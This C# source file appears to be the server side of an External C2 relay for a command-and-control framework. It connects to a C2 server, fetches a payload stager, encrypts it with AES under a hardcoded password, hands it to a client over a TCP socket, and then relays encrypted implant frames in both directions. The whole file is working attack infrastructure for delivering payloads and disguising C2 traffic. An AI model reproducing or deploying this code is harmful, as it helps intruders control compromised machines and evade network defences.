using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using ExternalC2;
using System.Net.Sockets;
using System.Net;

namespace Server
{
    class Program
    {
        static void Main(string[] args)
        {
            string ip = args[0];
            string port = args[1];
            string rhost = "127.0.0.1";
            int rport = 7001;
            byte[] recvBytes = Encoding.Default.GetBytes("");
            SocketC2 socketC2 = new SocketC2(ip,port);
            socketC2.ServerChannel.Connect();
            byte[] sta = Encrypt(socketC2.ServerChannel.GetStager("qaxnb", true, 500));
            Console.WriteLine(sta.Length);
            List<byte> data = new List<byte>();
            byte[] buffer = new byte[1024];
            int length = 0;
            IPEndPoint iPEnd = new IPEndPoint(IPAddress.Parse(rhost),rport);
            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            s.Bind(iPEnd);
            s.Listen(0);
            Socket temp = s.Accept();
            temp.Send(sta, sta.Length, 0);
            while (true)
            {
                try
                {
                    while ((length = temp.Receive(buffer)) > 0)
                    {
                        for (int i = 0; i < length; i++)
                        {
                            data.Add(buffer[i]);
                        }
                        if (length < buffer.Length)
                        {
                            break;
                        }
                    }
                }
                catch { }
                if (data.Count > 0)
                {
                    Console.WriteLine("client返回长度：  " + data.ToArray().Length);
                    socketC2.ServerChannel.SendFrame(Decrypt(data.ToArray()));
                    data.Clear();
                }
                else
                    Console.WriteLine("client返回空");
                data.Clear();
                recvBytes = Encrypt(socketC2.ServerChannel.ReadFrame());
                temp.Send(recvBytes,recvBytes.Length,0) ;

            }

        }
        public static byte[] Encrypt(byte[] input)
        {
            PasswordDeriveBytes pdb = new PasswordDeriveBytes("hjiweykaksd", new byte[] { 0x43, 0x87, 0x23, 0x72 }); // Change this
            MemoryStream ms = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = pdb.GetBytes(aes.KeySize / 8);
            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
            cs.Write(input, 0, input.Length);
            cs.Close();
            return ms.ToArray();
        }

        public static byte[] Decrypt(byte[] input)
        {
            PasswordDeriveBytes pdb =
              new PasswordDeriveBytes("hjiweykaksd", // Change this
              new byte[] { 0x43, 0x87, 0x23, 0x72 }); // Change this
            MemoryStream ms = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = pdb.GetBytes(aes.KeySize / 8);
            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream(ms,
              aes.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(input, 0, input.Length);
            cs.Close();
            return ms.ToArray();
        }
    }
}
